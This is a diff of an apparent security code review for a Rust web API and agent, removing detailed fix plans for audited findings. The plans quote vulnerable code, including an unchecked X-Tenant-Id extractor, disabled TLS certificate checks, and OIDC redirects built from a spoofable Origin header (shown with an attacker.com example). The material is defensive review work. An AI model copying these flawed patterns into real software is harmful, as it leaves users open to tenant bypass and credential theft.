-           Ok(ServerCertVerified::assertion())
-       }
-
-       fn verify_tls12_signature(&self, message: &[u8], cert: &CertificateDer<'_>, dss: &DigitallySignedStruct) -> Result<HandshakeSignatureValid, Error> {
-           // Delegate to the default WebPKI verifier for signature math
-           rustls::crypto::ring::default_provider()
-               .verify_tls12_signature(message, cert, dss)
-       }
-
-       fn verify_tls13_signature(&self, message: &[u8], cert: &CertificateDer<'_>, dss: &DigitallySignedStruct) -> Result<HandshakeSignatureValid, Error> {
-           rustls::crypto::ring::default_provider()
-               .verify_tls13_signature(message, cert, dss)
-       }
-   }
-   ```
-   This ensures the server actually holds the private key for the certificate it presents, preventing passive MITM.
-
-2. **Add CA certificate fingerprint logging and verification:**
-   After fetching the CA cert via TOFU, compute and display its SHA-256 fingerprint:
-   ```rust
-   let fingerprint = sha256_fingerprint(&ca_pem);
-   tracing::warn!(
-       "TOFU: accepted CA certificate with fingerprint SHA256:{}",
-       fingerprint
-   );
-   tracing::warn!(
-       "TOFU: verify this fingerprint matches your controller's CA"
-   );
-   ```
-
-3. **Add `--tofu-fingerprint <SHA256:hex>` optional flag:**
-   ```rust
-   #[arg(long, requires = "tofu")]
-   pub tofu_fingerprint: Option<String>,
-   ```
-   When provided, after fetching the CA cert, verify the fingerprint matches. If it doesn't, abort enrollment with an error. This provides SSH-like `known_hosts` behavior.
-
-4. **Fix the CLI client** (`crates/ui/cli/src/client.rs`):
-   - Remove the hardcoded `tls_danger_accept_invalid_certs(true)`
-   - Add a `--insecure` flag (off by default) to opt in to insecure TLS
-   - When no `--insecure` flag, use system trust store or a configured CA cert
-
-5. **Add a deprecation path for `--tofu` without fingerprint:**
-   - Log a prominent warning when `--tofu` is used without `--tofu-fingerprint`
-   - Document that `--tofu-fingerprint` is the recommended approach
-
-**Files to modify:**
-- `crates/shared/enrollment/src/tls.rs` — replace `AcceptAnyCert` with `TofuVerifier`
-- `crates/shared/enrollment/src/ca.rs` — add fingerprint display and verification
-- `crates/shared/enrollment/src/cli.rs` — add `--tofu-fingerprint` arg
-- `crates/ui/cli/src/client.rs` — remove hardcoded insecure TLS, add `--insecure` flag
-- `crates/core/agent/src/main.rs` — pass `tofu_fingerprint` to `bootstrap_ca`
-
-**Testing:**
-- Unit test: `TofuVerifier` rejects invalid signatures
-- Unit test: `TofuVerifier` accepts valid self-signed cert with correct signature
-- Unit test: fingerprint mismatch aborts enrollment
-- Integration test: TOFU enrollment succeeds with correct fingerprint
+> **Complete Coverage** — Thirty-one implementation-ready fix plans below cover all 35 findings: 1 Critical, 7 High, 11 Medium, and 16 Low. Additionally, 3 issues (HI-6, HI-7, ME-17) have fix plans in the wire protocol CODEREVIEW.
 
 ---
 
@@ -1023,69 +430,6 @@ pub async fn logout(
 - Unit test: logout with someone else's token returns 403
 - Unit test: logout with own valid token returns 204 and revokes session
 - Unit test: logout with already-revoked token returns 204 (idempotent)
-
----
-
-### FP-CR4: Restrict tenant context header (TOP 5 — #7)
-
-**Addresses:** CR-4 (Critical — tenant isolation bypass, latent until multi-tenancy)
-
-**Problem:** The `TenantContext` Axum extractor (`web-api/src/middleware/tenant_context.rs:29-51`) reads the `X-Tenant-Id` header from any request and uses it directly as the tenant ID — with NO authorization check. Any client (authenticated or not) can set this header to any UUID. All 40+ route handlers across 7 route modules use `TenantContext` to scope database queries.
-
-**Current extractor:**
-```rust
-impl FromRequestParts<Arc<AppState>> for TenantContext {
-    async fn from_request_parts(parts: &mut Parts, state: &Arc<AppState>) -> Result<Self, Self::Rejection> {
-        if let Some(header_val) = parts.headers.get("x-tenant-id") {
-            let tenant_id = header_val.to_str()?.parse::<Uuid>()?;
-            return Ok(TenantContext { tenant_id });    // ← No auth check!
-        }
-        Ok(TenantContext { tenant_id: state.default_tenant_id })
-    }
-}
-```
-
-**Current risk:** In single-tenant mode, the risk is limited because there's only one tenant with data. But if multi-tenancy is ever activated, this becomes a complete tenant isolation bypass — any user can read/modify any tenant's data by setting the header.
-
-**An additional concern:** `require_auth` middleware always fetches permissions for `state.default_tenant_id` (hardcoded), not for the tenant in the request. This means even if a user has no permissions in tenant B, they'd still pass the permission check because permissions are loaded for the default tenant.
-
-**Detailed implementation plan:**
-
-1. **Immediate fix (single-tenant mode):** Ignore the `X-Tenant-Id` header entirely:
-   ```rust
-   impl FromRequestParts<Arc<AppState>> for TenantContext {
-       async fn from_request_parts(
-           parts: &mut Parts,
-           state: &Arc<AppState>,
-       ) -> Result<Self, Self::Rejection> {
-           // In single-tenant mode, always use the default tenant.
-           // Log if someone sends the header (could indicate misconfiguration or probing).
-           if parts.headers.get("x-tenant-id").is_some() {
-               tracing::warn!(
-                   "X-Tenant-Id header ignored in single-tenant mode"
-               );
-           }
-           Ok(TenantContext {
-               tenant_id: state.default_tenant_id,
-           })
-       }
-   }
-   ```
-
-2. **Future multi-tenant preparation (design only, not implemented now):**
-   - `require_auth` middleware must resolve the tenant from the request (header or path) and fetch the user's roles/permissions for **that** tenant
-   - `AuthenticatedUser` should include a `tenant_ids: Vec<Uuid>` field listing authorized tenants
-   - `TenantContext` extractor should verify `tenant_id ∈ auth_user.tenant_ids`
-   - Unauthenticated endpoints (login, register) always use the default tenant
-
-3. **Add a `multi_tenant` feature flag** to the `web-api` crate. The header-based tenant switching code should only compile when the flag is active. This prevents accidental re-introduction.
-
-**Files to modify:**
-- `crates/ui/web-api/src/middleware/tenant_context.rs` — ignore header, log warning
-
-**Testing:**
-- Unit test: request with `X-Tenant-Id` header returns data from `default_tenant_id` (not the header value)
-- Unit test: warning is logged when header is present
 
 ---
 
@@ -1297,164 +641,6 @@ fn sign_agent_csr(
 
 ---
 
-### FP-ME1: Implement refresh token rotation (TOP 5 — #10)
-
-**Addresses:** ME-1 (Medium — stolen refresh tokens remain usable for 7 days)
-
-**Problem:** When a refresh token is used at `POST /api/v1/auth/refresh`, the server verifies it and issues a new access token (JWT), but the refresh token itself is NOT rotated — the same token remains valid for its full 7-day lifetime. If stolen (via XSS, log exposure, or device theft), an attacker can silently maintain access for 7 days with no detection mechanism.
-
-**Current refresh flow (`web-api/src/routes/auth.rs:382-443`):**
-```rust
-pub async fn refresh(State(state): State<Arc<AppState>>, Json(req): Json<RefreshRequest>) -> Response {
-    let session_service = SessionService::new(state.db.clone());
-    let verified = session_service.verify_refresh_token(&req.refresh_token).await?;
-    // ... check user active, get permissions ...
-    let access_token = state.jwt.create_access_token(user.id, &permissions, ...)?;
-    // Returns ONLY new access token — refresh token unchanged
-    Json(RefreshResponse { access_token, expires_in, token_type })
-}
-```
-
-**Current `verify_refresh_token` (`web-api/src/auth/session.rs:62-92`):**
-```rust
-pub async fn verify_refresh_token(&self, token: &str) -> Result<VerifiedSession> {
-    let hash = token::hash_token(token);
-    let session = Session::find()
-        .filter(session::Column::RefreshTokenHash.eq(&hash))
-        .one(&self.db).await?
-        .ok_or(AuthError::InvalidRefreshToken)?;
-    if session.revoked_at.is_some() { return Err(AuthError::RefreshTokenRevoked); }
-    if session.expires_at <= OffsetDateTime::now_utc() { return Err(AuthError::RefreshTokenExpired); }
-    Ok(VerifiedSession { user_id: session.user_id, auth_method: ... })
-}
-```
-
-**Security impact:** With no rotation, there is no way to detect token theft. Both the attacker and the legitimate user can independently refresh using the same token. Compare with rotation: if the attacker refreshes first, the old token is revoked, and the legitimate user's next refresh attempt fails — immediately signaling a breach.
-
-**Detailed implementation plan:**
-
-1. **Add `rotate_refresh_token()` method to `SessionService`:**
-   ```rust
-   /// Atomically rotate a refresh token: verify old → revoke old → create new.
-   /// Returns the verified session info and the new plaintext refresh token.
-   pub async fn rotate_refresh_token(
-       &self,
-       old_token: &str,
-       user_agent: Option<String>,
-       ip_address: Option<String>,
-   ) -> Result<(VerifiedSession, String)> {
-       let verified = self.verify_refresh_token(old_token).await?;
-
-       // Revoke the old token
-       self.revoke_refresh_token(old_token).await?;
-
-       // Create a new session with a fresh token
-       let new_token = self.create_refresh_token(
-           verified.user_id,
-           verified.auth_method.clone(),
-           user_agent,
-           ip_address,
-       ).await?;
-
-       Ok((verified, new_token))
-   }
-   ```
-
-2. **Add replay detection — revoke all sessions on reuse of revoked token:**
-   ```rust
-   pub async fn verify_refresh_token(&self, token: &str) -> Result<VerifiedSession> {
-       let hash = token::hash_token(token);
-       let session = Session::find()
-           .filter(session::Column::RefreshTokenHash.eq(&hash))
-           .one(&self.db).await?
-           .ok_or(AuthError::InvalidRefreshToken)?;
-
-       if session.revoked_at.is_some() {
-           // REPLAY DETECTED: a revoked token was reused.
-           // This means the old token was stolen before rotation.
-           // Revoke ALL sessions for this user as a safety measure.
-           tracing::warn!(
-               user_id = %session.user_id,
-               "Revoked refresh token reused — revoking all sessions (possible token theft)"
-           );
-           self.revoke_all_user_sessions(session.user_id).await?;
-           return Err(report!(AuthError::RefreshTokenRevoked));
-       }
-
-       if session.expires_at <= OffsetDateTime::now_utc() {
-           return Err(report!(AuthError::RefreshTokenExpired));
-       }
-       Ok(VerifiedSession { user_id: session.user_id, auth_method: ... })
-   }
-
-   /// Revoke all active sessions for a user (nuclear option on token theft).
-   async fn revoke_all_user_sessions(&self, user_id: Uuid) -> Result<()> {
-       let now = OffsetDateTime::now_utc();
-       Session::update_many()
-           .col_expr(session::Column::RevokedAt, Expr::value(Some(now)))
-           .filter(session::Column::UserId.eq(user_id))
-           .filter(session::Column::RevokedAt.is_null())
-           .exec(&self.db)
-           .await
-           .context_to()?;
-       Ok(())
-   }
-   ```
-
-3. **Update the refresh endpoint to return the new token:**
-   ```rust
-   pub async fn refresh(
-       State(state): State<Arc<AppState>>,
-       Json(req): Json<RefreshRequest>,
-   ) -> Response {
-       let session_service = SessionService::new(state.db.clone());
-       let (verified, new_refresh_token) = match session_service
-           .rotate_refresh_token(&req.refresh_token, None, None)
-           .await
-       {
-           Ok(v) => v,
-           Err(_) => return error_response(StatusCode::UNAUTHORIZED, "Invalid or expired refresh token"),
-       };
-
-       // ... check user active, get permissions, create JWT ...
-
-       Json(RefreshResponse {
-           access_token,
-           refresh_token: new_refresh_token,    // NEW FIELD
-           expires_in: state.jwt.expires_in(),
-           token_type: "Bearer".to_string(),
-       }).into_response()
-   }
-   ```
-
-4. **Update `RefreshResponse` type:**
-   ```rust
-   pub struct RefreshResponse {
-       pub access_token: String,
-       pub refresh_token: String,    // ← ADD
-       pub expires_in: u64,
-       pub token_type: String,
-   }
-   ```
-
-5. **Frontend update:** The SvelteKit auth store must persist the new `refresh_token` from each refresh response, replacing the old one. This is a one-line change in the token refresh handler.
-
-**Files to modify:**
-- `crates/ui/web-api/src/auth/session.rs` — add `rotate_refresh_token()`, `revoke_all_user_sessions()`, replay detection in `verify_refresh_token()`
-- `crates/ui/web-api/src/routes/auth.rs` — call `rotate_refresh_token()`, return new token
-- `crates/shared/web-api-types/src/auth.rs` — add `refresh_token` field to `RefreshResponse`
-- `frontend/src/lib/` — update auth store to persist new refresh token
-
-**Testing:**
-- Unit test: rotation creates new token and revokes old one
-- Unit test: old token is invalid after rotation
-- Unit test: new token works after rotation
-- Unit test: reuse of revoked token triggers revocation of ALL user sessions
-- Unit test: concurrent rotation attempts — second attempt sees revoked token → triggers nuclear revoke
-- Integration test: full login → refresh (with rotation) → refresh (with new token) cycle
-
----
-
 ### FP-HI8: Fix FK cascade inconsistencies (TOP 5 — #11)
 
 **Addresses:** HI-8 (High — FK missing ON DELETE), HI-9 (High — missing FK entirely)
@@ -1608,57 +794,6 @@ async fn load_host_agents(
 
 ---
 
-### FP-HI11: Add rate limiting to device approval endpoint (TOP 5 — #13)
-
-**Addresses:** HI-11 (High — brute-force risk), ME-5 (Medium — device flow approval lacks rate limiting)
-
-**Problem:** The `/api/v1/auth/device/approve` endpoint is NOT in the `RATE_LIMITS` HashMap and has no rate limiting. Device flow user codes are short (typically 8 characters) and can be brute-forced. Any authenticated user can approve device flows regardless of permissions.
-
-**Note:** The original HI-11 finding mentions the refresh endpoint, which has since been added to `RATE_LIMITS` at 10 req/min. The remaining gap is `/api/v1/auth/device/approve`.
-
-**Current `RATE_LIMITS` configuration (`middleware/rate_limit.rs:20-58`):**
-```rust
-static RATE_LIMITS: LazyLock<HashMap<&'static str, EndpointRateLimit>> = LazyLock::new(|| {
-    HashMap::from([
-        ("/api/v1/auth/login",        EndpointRateLimit { max_requests: 10, window_secs: 60 }),
-        ("/api/v1/auth/register",     EndpointRateLimit { max_requests: 10, window_secs: 60 }),
-        ("/api/v1/auth/refresh",      EndpointRateLimit { max_requests: 10, window_secs: 60 }),
-        ("/api/v1/auth/device",       EndpointRateLimit { max_requests: 10, window_secs: 60 }),
-        ("/api/v1/auth/device/poll",  EndpointRateLimit { max_requests: 12, window_secs: 60 }),
-        // ❌ MISSING: /api/v1/auth/device/approve
-    ])
-});
-```
-
-**Detailed implementation plan:**
-
-1. **Add `/api/v1/auth/device/approve` to `RATE_LIMITS`:**
-   ```rust
-   (
-       "/api/v1/auth/device/approve",
-       EndpointRateLimit {
-           max_requests: 5,    // Strict — approval is infrequent
-           window_secs: 60,
-       },
-   ),
-   ```
-
-2. **Add permission check to the approval handler** (addresses ME-5):
-   The approval endpoint should require a specific permission (e.g., `ManageAgents` or a new `ApproveDeviceFlow` permission) rather than allowing any authenticated user to approve. This is a defense-in-depth measure beyond rate limiting.
-
-3. **Update tests:** Add `/api/v1/auth/device/approve` to the `rate_limited_paths_list` test and remove it from `non_rate_limited_paths` if present.
-
-**Files to modify:**
-- `crates/ui/web-api/src/middleware/rate_limit.rs` — add endpoint to `RATE_LIMITS`
-- `crates/ui/web-api/src/routes/device_auth.rs` — add permission check to approval handler
-
-**Testing:**
-- Unit test: 6th approval request within 60 seconds returns 429
-- Unit test: unauthenticated approval returns 401
-- Unit test: authenticated user without permission returns 403
-
----
-
 ### FP-ME2: Check email_verified before OIDC auto-link (TOP 5 — #14)
 
 **Addresses:** ME-2 (Medium — account takeover via unverified email)
@@ -1753,102 +888,6 @@ if let Some(found_user) = User::find()
 
 ---
 
-### FP-ME6: Check user active status on JWT-authenticated requests (TOP 5 — #15)
-
-**Addresses:** ME-6 (Medium — deactivated user access for up to 15 minutes)
-
-**Problem:** The `authenticate_jwt()` function in `web-api/src/middleware/require_auth.rs:125-156` is completely stateless — it decodes the JWT, extracts claims, and returns `AuthenticatedUser` without any database query. When an admin deactivates a user, the user's existing JWT tokens remain valid for their remaining lifetime (up to 15 minutes). In contrast, the `authenticate_api_token()` path correctly checks `is_active` on every request.
-
-**Current JWT path (`require_auth.rs:125-156`):**
-```rust
-fn authenticate_jwt(                    // ← synchronous, no DB access
-    state: &AppState,
-    token: &str,
-) -> std::result::Result<AuthenticatedUser, AuthFailure> {
-    let claims = state.jwt.decode_access_token(token)?;
-    let user_id = uuid::Uuid::parse_str(&claims.sub)?;
-    // ... extract auth_method from claims ...
-    // ❌ NO DATABASE CHECK — returns directly from JWT claims
-    Ok(AuthenticatedUser {
-        user_id,
-        auth_method,
-        permissions: claims.permissions,
-    })
-}
-```
-
-**Current API token path (for comparison, `require_auth.rs:91-123`):**
-```rust
-async fn authenticate_api_token(state: &AppState, token: &str) -> Result<...> {
-    let (user_id, _) = service.verify_token(token).await?;
-    let user = User::find_by_id(user_id).one(&state.db).await?;
-    if !user.is_active {                // ✅ checks active status
-        return Err(AuthFailure::Forbidden("User is deactivated\n"));
-    }
-    // ...
-}
-```
-
-**Detailed implementation plan:**
-
-1. **Convert `authenticate_jwt` to async and add DB check:**
-   ```rust
-   async fn authenticate_jwt(
-       state: &AppState,
-       token: &str,
-   ) -> std::result::Result<AuthenticatedUser, AuthFailure> {
-       let claims = state
-           .jwt
-           .decode_access_token(token)
-           .map_err(|_| AuthFailure::Unauthorized("Invalid or expired token\n"))?;
-
-       let user_id = uuid::Uuid::parse_str(&claims.sub)
-           .map_err(|_| AuthFailure::Unauthorized("Invalid token subject\n"))?;
-
-       // Check user is active (matches API token behavior)
-       let user = User::find_by_id(user_id)
-           .one(&state.db)
-           .await
-           .map_err(|_| AuthFailure::InternalError)?
-           .ok_or(AuthFailure::Unauthorized("User not found\n"))?;
-
-       if !user.is_active {
-           return Err(AuthFailure::Forbidden("User is deactivated\n"));
-       }
-
-       let auth_method = /* ... existing auth_method extraction ... */;
-
-       Ok(AuthenticatedUser {
-           user_id,
-           auth_method,
-           permissions: claims.permissions,
-       })
-   }
-   ```
-
-2. **Update the call site in `require_auth` middleware** (around line 58):
-   ```rust
-   // Before:
-   match authenticate_jwt(&state, &token) {
-   // After:
-   match authenticate_jwt(&state, &token).await {
-   ```
-
-3. **Performance consideration:** This adds one `SELECT users WHERE id = ?` query per JWT-authenticated request. This is a primary key lookup (indexed, sub-millisecond on SQLite/PostgreSQL). Given that the API token path already performs this check on every request, consistency is more important than the minor performance cost.
-
-4. **Alternative (deferred, if performance becomes an issue):** Add an in-memory `deactivated_users: DashSet<Uuid>` cache to `AppState`, populated on user deactivation, checked on JWT auth. This avoids the DB query but adds complexity. Not recommended unless profiling shows the DB check is a bottleneck.
-
-**Files to modify:**
-- `crates/ui/web-api/src/middleware/require_auth.rs` — make `authenticate_jwt` async, add DB check
-
-**Testing:**
-- Unit test: deactivated user's JWT is rejected with 403
-- Unit test: active user's JWT still works
-- Unit test: deleted user (not in DB) returns 401
-- Integration test: deactivate user → immediate JWT rejection (no 15-minute delay)
-
----
-
 ### FP-ME9: Block SSRF in GitHub provider (TOP 10 — #16)
 
 **Addresses:** ME-9 (Medium — SSRF via admin-configurable `api_base_url`)
@@ -1937,66 +976,6 @@ pub fn validate(&self) -> Result<()> {
 
 ---
 
-### FP-ME11: Require ExternalBaseUrl for OIDC (TOP 10 — #17)
-
-**Addresses:** ME-11 (Medium — OIDC redirect to attacker domain via Origin/Host header)
-
-**Problem:** When `ExternalBaseUrl` is not configured, `oidc_auth.rs` constructs the OIDC redirect URL from client-supplied `Origin` or `Host` headers via `base_url_from_headers()`. An attacker can set `Origin: https://attacker.com` and the OIDC callback URL becomes `https://attacker.com/api/v1/auth/oidc/callback`, redirecting the authorization code to the attacker's server.
-
-**Current code (`oidc_auth.rs:1182-1196`):**
-```rust
-fn base_url_from_headers(headers: &HeaderMap) -> Option<String> {
-    // Trusts Origin header directly
-    let origin = headers.get("origin").and_then(|v| v.to_str().ok())...;
-    if origin.is_some_and(|s| !s.is_empty()) { return origin; }
-    // Falls back to Host header
-    headers.get("host").and_then(|v| v.to_str().ok())
-        .map(|h| format!("https://{}", h))
-}
-```
-
-**Detailed implementation plan:**
-
-1. **Make `ExternalBaseUrl` required when OIDC is configured.** At OIDC provider creation/activation time, verify `ExternalBaseUrl` is set. Return an error if not:
-   ```rust
-   // In oidc_providers.rs create/update handler:
-   if external_base_url.is_none() {
-       return error_response(
-           StatusCode::BAD_REQUEST,
-           "external_base_url setting must be configured before enabling OIDC providers"
-       );
-   }
-   ```
-
-2. **Remove `base_url_from_headers()` fallback from OIDC flows.** In both `oidc_authorize` and the callback handler, require `ExternalBaseUrl`:
-   ```rust
-   let base_url = match external_base_url {
-       Some(Extension(u)) => u.0,
-       None => {
-           tracing::error!("OIDC flow attempted without ExternalBaseUrl configured");
-           return error_response(
-               StatusCode::INTERNAL_SERVER_ERROR,
-               "Server misconfiguration: external_base_url not set"
-           );
-       }
-   };
-   ```
-
-3. **Keep `base_url_from_headers()` only for non-security-sensitive uses** (if any). If it's only used by OIDC, delete it entirely.
-
-4. **Add a startup warning** if OIDC providers exist but `ExternalBaseUrl` is not configured.
-
-**Files to modify:**
-- `crates/ui/web-api/src/routes/oidc_auth.rs` — remove header fallback, require `ExternalBaseUrl`
-- `crates/ui/web-api/src/routes/oidc_providers.rs` — validate `ExternalBaseUrl` on create/activate
-
-**Testing:**
-- Unit test: OIDC authorize without `ExternalBaseUrl` returns 500
-- Unit test: OIDC authorize with `ExternalBaseUrl` constructs correct redirect URL
-- Unit test: attacker-controlled `Origin` header is ignored
-
----
-
 ### FP-ME4: Rate limit fails closed on database error (TOP 10 — #18)
 
 **Addresses:** ME-4 (Medium — rate limiting completely disabled during DB outage)
@@ -2051,7 +1030,7 @@ Err(e) => {
    }
    ```
 
-3. **Add periodic cleanup** of stale entries (every 5 minutes, remove entries older than 2× window).
+3. **Add periodic cleanup** of stale entries (every 5 minutes, remove entries older than 2x window).
 
 4. **The in-memory limiter is per-instance** (not HA-safe), but that's acceptable as a degraded-mode fallback — it still prevents single-instance brute-force, which is better than no limiting at all.
 
@@ -2103,212 +1082,6 @@ pub async fn device_auth_approve(
 **Testing:**
 - Unit test: user without `ManageAgents` returns 403
 - Unit test: user with `ManageAgents` can approve
-
----
-
-### FP-ME15: Restrict private key file permissions (TOP 10 — #20)
-
-**Addresses:** ME-15 (Medium — server key files world-readable on permissive systems)
-
-**Problem:** `std::fs::write()` in `pki.rs:713-714` and `server_cert.rs:137-140` writes private key files using the default umask. On systems with a permissive umask (e.g., `0022`), key files are created with mode `0644` — readable by all users.
-
-**Current code (pki.rs:713-714):**
-```rust
-fs::write(&cert_path, &bundle.cert_pem).context_to::<PkiError>()?;
-fs::write(&key_path, &bundle.key_pem).context_to::<PkiError>()?;  // world-readable key!
-```
-
-**Detailed implementation plan:**
-
-1. **Create a `write_private_key()` helper** that sets restrictive permissions:
-   ```rust
-   #[cfg(unix)]
-   fn write_private_key(path: &std::path::Path, content: &str) -> std::io::Result<()> {
-       use std::os::unix::fs::OpenOptionsExt;
-       let mut file = std::fs::OpenOptions::new()
-           .write(true)
-           .create(true)
-           .truncate(true)
-           .mode(0o600)  // owner read/write only
-           .open(path)?;
-       std::io::Write::write_all(&mut file, content.as_bytes())?;
-       Ok(())
-   }
-
-   #[cfg(not(unix))]
-   fn write_private_key(path: &std::path::Path, content: &str) -> std::io::Result<()> {
-       std::fs::write(path, content)
-   }
-   ```
-
-2. **Replace `fs::write()` for key files** in both locations:
-   - `pki.rs:714`: `write_private_key(&key_path, &bundle.key_pem)?`
-   - `server_cert.rs:140`: `write_private_key(&key_path, &key_pem)?`
-
-3. **Cert files can remain `0644`** — they're public. Only key files need restriction.
-
-**Files to modify:**
-- `crates/core/controller/src/pki.rs` — use `write_private_key` for key files
-- `crates/ui/web-api/src/routes/server_cert.rs` — same
-
-**Testing:**
-- Unit test (unix): written key file has mode `0600`
-- Unit test: cert file still writable/readable normally
-
----
-
-### FP-ME3: Fix TOCTOU race in rate limiter (TOP 10 — #21)
-
-**Addresses:** ME-3 (Medium — concurrent requests bypass rate limit check)
-
-**Problem:** The DB-backed rate limiter in `auth/rate_limit.rs:62-106` uses a read-then-update pattern. Between the `SELECT` (count check) and the `UPDATE` (increment), concurrent requests can both pass the limit check before either increments the counter, allowing `N` extra requests through (where N = concurrent instances).
-
-**Current flow:**
-```
-1. SELECT request_count WHERE key = ?      ← reads 9
-2. if request_count >= limit → block       ← 9 < 10, passes
-3. UPDATE SET request_count = count + 1    ← writes 10
-   (concurrent request also reads 9 at step 1, also passes)
-```
-
-**Detailed implementation plan:**
-
-1. **Use atomic conditional UPDATE** that combines check and increment in one statement:
-   ```rust
-   pub async fn check_rate_limit(&self, key: &str, max_requests: u32, window_secs: u64) -> Result<RateLimitOutcome> {
-       let now = OffsetDateTime::now_utc();
-       let threshold = now - time::Duration::seconds(window_secs as i64);
-
-       // Atomic: increment only if within window AND under limit
-       let result = ApiRateLimit::update_many()
-           .col_expr(
-               api_rate_limit::Column::RequestCount,
-               Expr::col(api_rate_limit::Column::RequestCount).add(1),
-           )
-           .filter(api_rate_limit::Column::Key.eq(key))
-           .filter(api_rate_limit::Column::WindowStart.gte(threshold))
-           .filter(api_rate_limit::Column::RequestCount.lt(max_requests as i32))
-           .exec(&self.db)
-           .await?;
-
-       if result.rows_affected == 1 {
-           return Ok(RateLimitOutcome::Allowed);
-       }
-
-       // Either no row, expired window, or at limit — check which
-       let existing = ApiRateLimit::find_by_id(key).one(&self.db).await?;
-       match existing {
-           Some(row) if row.window_start >= threshold && row.request_count >= max_requests as i32 => {
-               // At limit
-               let retry_after = /* compute */;
-               Ok(RateLimitOutcome::Limited { retry_after_secs: retry_after })
-           }
-           _ => {
-               // No row or expired window — start fresh
-               self.upsert_new_window(key, now, window_secs).await?;
-               Ok(RateLimitOutcome::Allowed)
-           }
-       }
-   }
-   ```
-
-2. **The key insight:** By adding `.filter(RequestCount.lt(max_requests))` to the UPDATE, the DB atomically increments only if under the limit. If two requests race, the first to execute the UPDATE increments to the limit; the second UPDATE affects 0 rows and falls through to the rate-limited path.
-
-**Files to modify:**
-- `crates/ui/web-api/src/auth/rate_limit.rs` — rewrite `check_rate_limit` with atomic conditional update
-
-**Testing:**
-- Unit test: sequential requests correctly count up to limit
-- Concurrent test: spawn N tasks, verify total allowed ≤ limit
-
----
-
-### FP-ME8: Atomic settings reload (TOP 10 — #22)
-
-**Addresses:** ME-8 (Medium — partially-updated settings visible between lock releases)
-
-**Problem:** `reload_from_db()` in `settings.rs:232-281` acquires and releases individual `RwLock`s for each setting field sequentially. Between lock releases, a reader can observe a mix of old and new values (e.g., new registration mode but old cert lifetime).
-
-**Current code (simplified):**
-```rust
-pub async fn reload_from_db(&self, db: &DatabaseConnection, tenant_id: Uuid) -> Result<()> {
-    let raw = load_all_settings(db, tenant_id).await?;
-    *self.inner.registration.write().await = RegistrationSettings::from_raw(&raw);
-    // ← Reader here sees new registration but old cert_lifetime
-    *self.inner.agent_cert_lifetime_days.write().await = ...;
-    // ← Reader here sees new registration + cert_lifetime but old network
-    *self.inner.network.write().await = ...;
-    // ...
-}
-```
-
-**Detailed implementation plan:**
-
-1. **Replace individual `RwLock` fields with a single `ArcSwap<SettingsSnapshot>`:**
-   ```rust
-   use arc_swap::ArcSwap;
-
-   pub struct SettingsSnapshot {
-       pub registration: RegistrationSettings,
-       pub authentication: AuthenticationSettings,
-       pub agent_cert_lifetime_days: u16,
-       pub renewal_window_hours: u16,
-       pub network: NetworkSettings,
-       pub mqtt_max_clients_per_tenant: u16,
-   }
-
-   struct Inner {
-       snapshot: ArcSwap<SettingsSnapshot>,
-       version: AtomicI64,
-       global_version: AtomicI64,
-   }
-   ```
-
-2. **Atomic reload:** Build the entire snapshot, then swap in one operation:
-   ```rust
-   pub async fn reload_from_db(&self, db: &DatabaseConnection, tenant_id: Uuid) -> Result<()> {
-       let raw = load_all_settings(db, tenant_id).await?;
-       let new_snapshot = Arc::new(SettingsSnapshot {
-           registration: RegistrationSettings::from_raw(&raw),
-           authentication: AuthenticationSettings::from_raw(&raw),
-           agent_cert_lifetime_days: /* ... */,
-           renewal_window_hours: /* ... */,
-           network: Self::load_network_settings(&raw),
-           mqtt_max_clients_per_tenant: /* ... */,
-       });
-       self.inner.snapshot.store(new_snapshot);
-       // Version updates remain atomic via AtomicI64
-       // ...
-       Ok(())
-   }
-   ```
-
-3. **Readers use `snapshot.load()`** which returns an `Arc` — always a consistent point-in-time view:
-   ```rust
-   pub async fn agent_cert_lifetime_days(&self) -> u16 {
-       self.inner.snapshot.load().agent_cert_lifetime_days
-   }
-   ```
-
-4. **For individual field writes** (e.g., settings API updating one field), use `rcu()` (read-copy-update):
-   ```rust
-   pub async fn set_agent_cert_lifetime_days(&self, days: u16) {
-       self.inner.snapshot.rcu(|current| {
-           let mut new = (**current).clone();
-           new.agent_cert_lifetime_days = days;
-           Arc::new(new)
-       });
-   }
-   ```
-
-**Files to modify:**
-- `crates/ui/web-api/src/settings.rs` — replace `RwLock` fields with `ArcSwap`
-- `crates/ui/web-api/Cargo.toml` — add `arc-swap` dependency
-- All callers that read settings (transparent change via accessor methods)
-
-**Testing:**
-- Unit test: concurrent reads during reload always see consistent snapshots
-- Unit test: individual field updates are reflected atomically
 
 ---
 
@@ -2547,83 +1320,6 @@ url.push_str(sc);          // ← raw, unencoded
 **Testing:**
 - Unit test: scope containing `&extra=1` is properly encoded, not split into separate params
 - Unit test: standard Docker Hub `service`/`scope` values encode correctly
-
----
-
-### FP-ME14: Fix settings version bump race (#27)
-
-**Addresses:** ME-14 (Medium — unique constraint violation on concurrent first-time writes)
-
-**Problem:** `settings_store.rs:127-172` uses an update-then-insert-if-zero pattern for `settings_version`. Two concurrent first-time writes for a new tenant can both see `rows_affected == 0` and both attempt to insert, causing a unique constraint violation on `tenant_id`.
-
-**Current code:**
-```rust
-let result = SettingsVersion::update_many()
-    .col_expr(Version, Expr::col(Version).add(1))
-    .filter(TenantId.eq(tenant_id))
-    .exec(db).await?;
-
-if result.rows_affected == 0 {
-    // Defensive: insert new row
-    settings_version::ActiveModel { tenant_id: Set(tenant_id), version: Set(1), ... }
-        .insert(db).await?;   // ← RACE: both threads try this
-}
-```
-
-**Detailed implementation plan:**
-
-1. **Use `INSERT ... ON CONFLICT` (upsert)** to make the operation atomic:
-   ```rust
-   // SQLite/PostgreSQL compatible upsert
-   let now = OffsetDateTime::now_utc();
-   let model = settings_version::ActiveModel {
-       tenant_id: Set(tenant_id),
-       version: Set(1),
-       global_version: Set(0),
-       revocation_version: Set(0),
-       updated_at: Set(now),
-   };
-
-   if is_global {
-       SettingsVersion::insert(model)
-           .on_conflict(
-               OnConflict::column(settings_version::Column::TenantId)
-                   .update_columns([
-                       settings_version::Column::GlobalVersion,
-                       settings_version::Column::UpdatedAt,
-                   ])
-                   .to_owned(),
-           )
-           .exec(db).await?;
-       // Then do the increment separately
-       SettingsVersion::update_many()
-           .col_expr(GlobalVersion, Expr::col(GlobalVersion).add(1))
-           .exec(db).await?;
-   } else {
-       SettingsVersion::insert(model)
-           .on_conflict(
-               OnConflict::column(settings_version::Column::TenantId)
-                   .update_columns([
-                       settings_version::Column::Version,
-                       settings_version::Column::UpdatedAt,
-                   ])
-                   .to_owned(),
-           )
-           .exec(db).await?;
-       SettingsVersion::update_many()
-           .col_expr(Version, Expr::col(Version).add(1))
